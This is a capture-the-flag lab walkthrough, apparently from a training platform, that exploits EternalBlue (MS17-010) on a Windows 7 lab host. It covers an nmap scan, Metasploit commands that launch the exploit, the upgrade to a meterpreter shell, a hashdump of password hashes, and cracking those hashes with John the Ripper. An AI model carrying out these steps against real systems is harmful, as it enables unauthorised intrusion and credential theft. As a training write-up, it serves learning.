#Windows #EternalBlue

**NMAP Scan**

```sh
  nmap -sV -sC -p- 10.10.33.86
  ```

- To see the versions of the services running (**-sV**)
- To perform a script scan using the default set of scripts (**-sC**)
- To scan all ports from 1 through 65535 (**-p-**)

OPEN PORTS

* 135/tcp msrpc Microsoft Windows RPC

![image](https://user-images.githubusercontent.com/99097743/171191732-73be2919-4881-4759-bf5a-eeb8b8460a9a.png)

* 139/tcp open  netbios-ssn Windows 7 Professional 7601 Service Pack 1 netbios-ssn

![image](https://user-images.githubusercontent.com/99097743/171191815-76b01734-be5b-4a75-b7d8-deaf07334a2d.png)

* 139/tcp open  netbios-ssn Windows 7 Professional 7601 Service Pack 1 netbios-ssn

![image](https://user-images.githubusercontent.com/99097743/171191940-4d44c027-59e1-45af-9635-fa1d279731d2.png)

* 3389/tcp open  ssl/ms-wbt-server?

![image](https://user-images.githubusercontent.com/99097743/171192028-c0d68993-f0d4-435b-bf66-4ecbf95e6992.png)


**MS10-010 KNOWLEDGE BASE**

Reference: https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/smb/ms17_010_eternalblue

ms17_010_eternalblue is a remote exploit against Microsoft Windows, originally written by the Equation Group (NSA) and leaked by Shadow Brokers (an unknown hacking entity). It is considered a reliable exploit and allows you to gain access not only as SYSTEM - the highest Windows user mode privilege, but also full control of the kernel in ring 0. In modern day penetration tests, this exploit can be used in internal and external environments.

As far as remote kernel exploits go, this one is highly reliable and safe to use.

The check command of ms17_010_eternalblue is also highly accurate, because Microsoft's patch inadvertently added an information disclosure with extra checks on vulnerable code paths.

This exploit works against a vulnerable SMB service from one of these Windows systems:

* Windows XP x86 (All Service Packs)
* Windows 2003 x86 (All Service Packs)
* Windows 7 x86 (All Service Packs)
* Windows 7 x64 (All Service Packs)
* Windows 2008 R2 x64 (All Service Packs)
* Windows 8.1 x64
* Windows Server 2012 R2 x64
* Windows 10 Pro x64 (< Version 1507)
* Windows 10 Enterprise Evaluation x64 (< Version 1507)

To determine whether the machine is vulnerable, you will have to either examine the system's patch level, or use a vulnerability check.

**GAIN FOOTHOLD**

We can now use `metasploit` to gain access. Here are the steps:

```sh
msfconsole
search eternalblue
use windows/smb/ms17_010_eternalblue
show options
set RHOSTS
set LHOST
run
```

![image](https://user-images.githubusercontent.com/99097743/171214941-056ec471-839f-4e63-829a-d382224b9803.png)


**ESCALATE**

We need to upgrade the shell from the command line to a more functional meterpreter. 

First, let's background the session by clicking `CTRL+Z`. You can see the active session with the `sessions` command:

![image](https://user-images.githubusercontent.com/99097743/171216893-e2977fe8-1f18-4294-bfca-a7b113bd62a4.png)

Now we need search for `shell_to_meterpreter`

![image](https://user-images.githubusercontent.com/99097743/171218485-79849cf9-a5c1-42dc-9387-c2c2e0673a92.png)

Please make sure the session info is updated: `set SESSION 1`

![image](https://user-images.githubusercontent.com/99097743/171218893-6f197426-71fd-43b4-94fb-0e82ba1cc9e8.png)

We can now list the sessions and select Session 2 for the rest of the lab:

![image](https://user-images.githubusercontent.com/99097743/171219818-c114247f-de7c-48b7-86fc-38e6e2590750.png)

**CRACKING**

`hashdump` command will dump all of the passwords on the machine as long as we have the correct privileges to do so.

![image](https://user-images.githubusercontent.com/99097743/171225571-382756c2-7d5f-4b85-aa8c-8b512b4f4a50.png)

We can crack the password using **John the Ripper**. Please make sure to include `--format=NT` here:

![image](https://user-images.githubusercontent.com/99097743/171227324-e3b7b13c-b2d5-49b6-b06e-0c81980c7a51.png)

**FLAGS**

Flag #1

![image](https://user-images.githubusercontent.com/99097743/171230327-a4df5672-e3f5-44f5-967c-46bef0cd094c.png)

Flag #2: Located where passwords are stored within Windows (SAM)

![image](https://user-images.githubusercontent.com/99097743/171230730-18af3044-fd5e-4208-b8bf-d8e83fe77f33.png)


